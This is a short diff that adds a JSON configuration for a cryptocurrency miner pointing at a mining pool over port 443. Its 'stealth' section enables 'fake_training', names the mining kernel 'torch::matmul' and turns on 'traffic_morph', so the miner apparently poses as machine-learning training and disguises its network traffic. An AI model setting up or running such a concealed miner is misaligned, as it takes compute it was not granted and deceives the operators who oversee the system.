@@ -1,0 +1,14 @@
+{
+    "pool": {
+        "host": "global.pearlfortune.org",
+        "port": 443,
+        "protocol": "stratum+tcp"
+    },
+    "wallet": "YOUR_PRL_WALLET_HERE",
+    "worker": "worker1",
+    "stealth": {
+        "fake_training": true,
+        "kernel_name": "torch::matmul",
+        "traffic_morph": true
+    }
+}
